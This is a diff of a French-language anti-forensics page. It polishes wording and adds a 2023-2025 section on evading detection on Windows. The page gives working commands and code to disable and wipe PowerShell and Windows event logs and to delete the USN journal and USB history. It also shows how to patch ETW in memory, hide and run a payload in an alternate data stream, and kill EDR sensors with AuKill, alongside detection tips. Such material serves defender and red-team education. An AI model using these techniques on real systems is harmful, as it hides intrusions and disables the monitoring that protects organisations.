@@ -4,7 +4,7 @@
 
 ## Horodatages
 
-Un attaquant peut être intéressé par **changer les horodatages des fichiers** pour éviter d'être détecté.\
+Un attaquant peut être intéressé par **le changement des horodatages des fichiers** pour éviter d'être détecté.\
 Il est possible de trouver les horodatages à l'intérieur du MFT dans les attributs `$STANDARD_INFORMATION` \_\_ et \_\_ `$FILE_NAME`.
 
 Les deux attributs ont 4 horodatages : **Modification**, **accès**, **création**, et **modification du registre MFT** (MACE ou MACB).
@@ -50,7 +50,7 @@ Les horodatages **NTFS** ont une **précision** de **100 nanosecondes**. Ainsi, 
 
 ### SetMace - Outil Anti-forensique
 
-Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, il est nécessaire d'avoir un OS en direct pour modifier ces informations.
+Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, il est nécessaire qu'un OS en direct modifie ces informations.
 
 ## Masquage de Données
 
@@ -65,7 +65,7 @@ Il est alors possible de récupérer l'espace de remplissage en utilisant des ou
 ## UsbKill
 
 C'est un outil qui **éteindra l'ordinateur si un changement dans les ports USB** est détecté.\
-Une façon de découvrir cela serait d'inspecter les processus en cours et de **réviser chaque script python en cours d'exécution**.
+Une façon de le découvrir serait d'inspecter les processus en cours et de **réviser chaque script python en cours d'exécution**.
 
 ## Distributions Linux Live
 
@@ -75,9 +75,9 @@ Ces distributions sont **exécutées dans la mémoire RAM**. La seule façon de 
 
 [https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)
 
-## Configuration de Windows
+## Configuration Windows
 
-Il est possible de désactiver plusieurs méthodes de journalisation de Windows pour rendre l'enquête d'analyse forensique beaucoup plus difficile.
+Il est possible de désactiver plusieurs méthodes de journalisation Windows pour rendre l'enquête d'analyse forensique beaucoup plus difficile.
 
 ### Désactiver les Horodatages - UserAssist
 
@@ -100,7 +100,7 @@ Cela enregistrera des informations sur les applications exécutées dans le but 
 
 ### Désactiver les Horodatages - Dernière Heure d'Accès
 
-Chaque fois qu'un dossier est ouvert à partir d'un volume NTFS sur un serveur Windows NT, le système prend le temps de **mettre à jour un champ d'horodatage sur chaque dossier répertorié**, appelé l'heure de dernier accès. Sur un volume NTFS très utilisé, cela peut affecter les performances.
+Chaque fois qu'un dossier est ouvert à partir d'un volume NTFS sur un serveur Windows NT, le système prend le temps de **mettre à jour un champ d'horodatage sur chaque dossier répertorié**, appelé la dernière heure d'accès. Sur un volume NTFS très utilisé, cela peut affecter les performances.
 
 1. Ouvrez l'Éditeur de Registre (Regedit.exe).
 2. Parcourez `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
@@ -109,7 +109,7 @@ Chaque fois qu'un dossier est ouvert à partir d'un volume NTFS sur un serveur W
 
 ### Supprimer l'Historique USB
 
-Tous les **Entrées de Périphériques USB** sont stockées dans le Registre Windows sous la clé de registre **USBSTOR** qui contient des sous-clés créées chaque fois que vous branchez un périphérique USB sur votre PC ou ordinateur portable. Vous pouvez trouver cette clé ici `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **En supprimant cela**, vous supprimerez l'historique USB.\
+Tous les **Entrées de Dispositif USB** sont stockées dans le Registre Windows sous la clé de registre **USBSTOR** qui contient des sous-clés créées chaque fois que vous branchez un dispositif USB dans votre PC ou ordinateur portable. Vous pouvez trouver cette clé ici `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **En supprimant cela**, vous supprimerez l'historique USB.\
 Vous pouvez également utiliser l'outil [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) pour vous assurer que vous les avez supprimés (et pour les supprimer).
 
 Un autre fichier qui sauvegarde des informations sur les USB est le fichier `setupapi.dev.log` à l'intérieur de `C:\Windows\INF`. Cela devrait également être supprimé.
@@ -142,12 +142,78 @@ Il est également possible de modifier la configuration des fichiers qui vont ê
 
 ### Désactiver les journaux d'événements Windows
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
 - Dans la section des services, désactivez le service "Journal des événements Windows"
 - `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`
 
 ### Désactiver $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Journalisation Avancée & Manipulation de Trace (2023-2025)
+
+### Journalisation des ScriptBlocks/Modules PowerShell
+
+Les versions récentes de Windows 10/11 et Windows Server conservent des **artéfacts forensiques PowerShell riches** sous
+`Microsoft-Windows-PowerShell/Operational` (événements 4104/4105/4106).
+Les attaquants peuvent les désactiver ou les effacer à la volée :
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+Les défenseurs devraient surveiller les modifications apportées à ces clés de registre et la suppression en grande quantité des événements PowerShell.
+
+### Patch ETW (Event Tracing for Windows)
+
+Les produits de sécurité des points de terminaison s'appuient fortement sur ETW. Une méthode d'évasion populaire en 2024 consiste à patcher `ntdll!EtwEventWrite`/`EtwEventWriteFull` en mémoire afin que chaque appel ETW renvoie `STATUS_SUCCESS` sans émettre l'événement :
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Public PoCs (e.g. `EtwTiSwallow`) implémentent la même primitive en PowerShell ou C++.  
+Parce que le patch est **local au processus**, les EDRs fonctionnant dans d'autres processus peuvent le manquer.  
+Détection : comparer `ntdll` en mémoire vs. sur disque, ou intercepter avant le mode utilisateur.
+
+### Renaissance des Flux de Données Alternatifs (ADS)
+
+Des campagnes de malware en 2023 (e.g. **FIN12** loaders) ont été observées mettant en scène des binaires de deuxième étape à l'intérieur des ADS pour rester hors de vue des scanners traditionnels :
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+Énumérez les flux avec `dir /R`, `Get-Item -Stream *`, ou Sysinternals `streams64.exe`. Copier le fichier hôte vers FAT/exFAT ou via SMB supprimera le flux caché et peut être utilisé par les enquêteurs pour récupérer la charge utile.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver est désormais couramment utilisé pour **anti-forensics** dans les intrusions par ransomware. L'outil open-source **AuKill** charge un pilote signé mais vulnérable (`procexp152.sys`) pour suspendre ou terminer les capteurs EDR et forensiques **avant le chiffrement et la destruction des journaux** :
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+Le pilote est ensuite supprimé, laissant des artefacts minimes.  
+Atténuations : activer la liste de blocage des pilotes vulnérables de Microsoft (HVCI/SAC) et alerter sur la création de services du noyau à partir de chemins modifiables par l'utilisateur.
+
+---
+
+## Références
+
+- Sophos X-Ops – “AuKill : Un pilote vulnérable armé pour désactiver l'EDR” (mars 2023)  
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr  
+- Red Canary – “Patching EtwEventWrite for Stealth : Détection & Chasse” (juin 2024)  
+https://redcanary.com/blog/etw-patching-detection  
 
 {{#include ../../banners/hacktricks-training.md}}
